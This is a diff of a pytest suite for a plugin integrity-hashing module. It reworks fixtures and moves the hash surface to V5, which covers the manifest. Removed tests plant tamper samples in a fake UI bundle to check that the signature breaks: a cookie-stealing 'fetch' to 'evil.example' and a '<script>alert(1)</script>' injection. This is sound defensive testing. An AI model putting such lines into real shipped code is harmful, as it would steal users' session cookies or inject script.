@@ -2,6 +2,7 @@
 
 from __future__ import annotations
 
+from collections.abc import Callable
 from pathlib import Path
 
 import pytest
@@ -91,34 +92,6 @@ def test_skip_check_ignored_in_production(
     assert verify_plugin_integrity(plugin_dir, "deadbeef" * 8) is False
 
 
-@pytest.fixture(autouse=True)
-def _hermetic_integrity_env(monkeypatch: pytest.MonkeyPatch) -> None:
-    """Integrity tests must not depend on ambient env / local .env flags.
-
-    ``core.config`` loads the repository .env into os.environ once at import;
-    a developer's ``BASELITH_SKIP_INTEGRITY_CHECK=true`` (dev escape hatch)
-    would silently turn hash-mismatch tests into no-ops.
-    """
-    monkeypatch.delenv("BASELITH_SKIP_INTEGRITY_CHECK", raising=False)
-    monkeypatch.delenv("BASELITH_REQUIRE_SIGNED_PLUGINS", raising=False)
-
-
-@pytest.fixture
-def plugin_dir(tmp_path: Path) -> Path:
-    """Create a minimal plugin directory tree for hashing."""
-    root = tmp_path / "demo_plugin"
-    root.mkdir()
-    (root / "manifest.yaml").write_text(
-        "name: demo\nversion: 1.0.0\n", encoding="utf-8"
-    )
-    (root / "plugin.py").write_text("def hello(): return 'hi'\n", encoding="utf-8")
-    sub = root / "skills"
-    sub.mkdir()
-    (sub / "__init__.py").write_text("", encoding="utf-8")
-    (sub / "module.pyi").write_text("def stub(): ...\n", encoding="utf-8")
-    return root
-
-
 def test_compute_hash_is_deterministic(plugin_dir: Path) -> None:
     h1 = compute_plugin_hash(plugin_dir)
     h2 = compute_plugin_hash(plugin_dir)
@@ -158,8 +131,13 @@ def test_compute_hash_excludes_node_modules_and_ui_build_inputs(
     assert compute_plugin_hash(plugin_dir) == baseline
 
 
-def test_compute_hash_excludes_manifest(plugin_dir: Path) -> None:
-    """Manifest is excluded so publishers can inject integrity_sha256 post-hash."""
+def test_compute_hash_tolerates_injected_integrity_field(plugin_dir: Path) -> None:
+    """Publishers can still inject integrity_sha256 after computing the digest.
+
+    From V5 the manifest *is* hashed, but through a canonical projection that
+    blanks the three self-referential supply-chain keys — see
+    ``test_integrity_manifest_surface.py`` for the coverage this buys.
+    """
     baseline = compute_plugin_hash(plugin_dir)
     (plugin_dir / "manifest.yaml").write_text(
         "name: demo\nversion: 1.0.0\nintegrity_sha256: deadbeef\n",
@@ -234,14 +212,14 @@ def test_compute_hash_covers_build_files(plugin_dir: Path) -> None:
     assert compute_plugin_hash(plugin_dir) != before_reqs
 
 
-def test_compute_hash_still_excludes_manifest(plugin_dir: Path) -> None:
-    """Manifest stays outside the digest so hash injection stays valid."""
+def test_compute_hash_covers_the_manifest_body(plugin_dir: Path) -> None:
+    """Anything but the injected supply-chain keys moves the digest (V5)."""
     base = compute_plugin_hash(plugin_dir)
     (plugin_dir / "manifest.yaml").write_text(
-        "name: demo\nversion: 1.0.0\nintegrity_sha256: deadbeef\n",
+        "name: demo\nversion: 1.0.1\nintegrity_sha256: deadbeef\n",
         encoding="utf-8",
     )
-    assert compute_plugin_hash(plugin_dir) == base
+    assert compute_plugin_hash(plugin_dir) != base
 
 
 def test_verify_rejects_tampered_build_file(plugin_dir: Path) -> None:
@@ -332,59 +310,6 @@ def test_verify_rejects_tampered_skill_md(plugin_dir: Path) -> None:
 # ── Shipped-asset hash surface (0.27+) ───────────────────────────────────────
 
 
-def _write_dist_bundle(plugin_dir: Path, body: str = "console.log(1)\n") -> Path:
-    """Create a compiled dashboard bundle under ``ui/dist/``."""
-    dist = plugin_dir / "ui" / "dist" / "assets"
-    dist.mkdir(parents=True, exist_ok=True)
-    bundle = dist / "index-abc123.js"
-    bundle.write_text(body, encoding="utf-8")
-    return bundle
-
-
-def test_compute_hash_covers_ui_dist_bundle(plugin_dir: Path) -> None:
-    """``ui/dist/**`` ships and executes in the console — it must be hashed."""
-    base = compute_plugin_hash(plugin_dir)
-    bundle = _write_dist_bundle(plugin_dir)
-    with_bundle = compute_plugin_hash(plugin_dir)
-    assert with_bundle != base
-
-    bundle.write_text("fetch('//evil.example/'+document.cookie)\n", encoding="utf-8")
-    assert compute_plugin_hash(plugin_dir) != with_bundle
-
-
-def test_legacy_surfaces_ignored_ui_dist(plugin_dir: Path) -> None:
-    """Regression guard: the pre-0.27 surfaces excluded the whole ``ui/`` tree."""
-    from core.plugins.integrity import HashSurface, compute_legacy_plugin_hash
-
-    before_v1 = compute_plugin_hash(plugin_dir, surface=HashSurface.V1_SOURCE)
-    before_v2 = compute_plugin_hash(plugin_dir, surface=HashSurface.V2_BUILD)
-    _write_dist_bundle(plugin_dir)
-    assert compute_plugin_hash(plugin_dir, surface=HashSurface.V1_SOURCE) == before_v1
-    assert compute_plugin_hash(plugin_dir, surface=HashSurface.V2_BUILD) == before_v2
-    assert compute_legacy_plugin_hash(plugin_dir) == before_v1
-
-
-def test_verify_rejects_tampered_ui_dist_bundle(plugin_dir: Path) -> None:
-    """Injected JS in the shipped bundle now invalidates the signature."""
-    bundle = _write_dist_bundle(plugin_dir)
-    signed = compute_plugin_hash(plugin_dir)
-    assert verify_plugin_integrity(plugin_dir, signed, strict=False) is True
-
-    bundle.write_text("/* backdoor */\n", encoding="utf-8")
-    assert verify_plugin_integrity(plugin_dir, signed, strict=False) is False
-    assert verify_plugin_integrity(plugin_dir, signed, strict=True) is False
-
-
-def test_verify_rejects_added_ui_dist_file(plugin_dir: Path) -> None:
-    """Dropping a new served file into the bundle also breaks the signature."""
-    _write_dist_bundle(plugin_dir)
-    signed = compute_plugin_hash(plugin_dir)
-    (plugin_dir / "ui" / "dist" / "evil.html").write_text(
-        "<script>alert(1)</script>", encoding="utf-8"
-    )
-    assert verify_plugin_integrity(plugin_dir, signed, strict=False) is False
-
-
 @pytest.mark.parametrize(
     "relpath",
     [
@@ -419,6 +344,7 @@ def test_compute_hash_covers_native_and_shell(plugin_dir: Path, relpath: str) ->
 
 def test_v2_signature_accepted_outside_strict_but_not_in_strict(
     plugin_dir: Path,
+    write_dist_bundle: Callable[..., Path],
 ) -> None:
     """Existing 0.17-0.26 signatures keep loading until re-signed."""
     from core.plugins.integrity import HashSurface
@@ -426,19 +352,19 @@ def test_v2_signature_accepted_outside_strict_but_not_in_strict(
     (plugin_dir / "pyproject.toml").write_text(
         '[build-system]\nrequires = ["setuptools"]\n', encoding="utf-8"
     )
-    _write_dist_bundle(plugin_dir)
+    write_dist_bundle(plugin_dir)
     v2 = compute_plugin_hash(plugin_dir, surface=HashSurface.V2_BUILD)
     assert v2 != compute_plugin_hash(plugin_dir)
     assert verify_plugin_integrity(plugin_dir, v2, strict=False) is True
     assert verify_plugin_integrity(plugin_dir, v2, strict=True) is False
 
 
-def test_current_surface_is_v3(plugin_dir: Path) -> None:
+def test_current_surface_is_v5(plugin_dir: Path) -> None:
     from core.plugins.integrity import CURRENT_HASH_SURFACE, HashSurface
 
-    assert CURRENT_HASH_SURFACE is HashSurface.V3_SHIPPED
+    assert CURRENT_HASH_SURFACE is HashSurface.V5_MANIFEST
     assert compute_plugin_hash(plugin_dir) == compute_plugin_hash(
-        plugin_dir, surface=HashSurface.V3_SHIPPED
+        plugin_dir, surface=HashSurface.V5_MANIFEST
     )
 
 
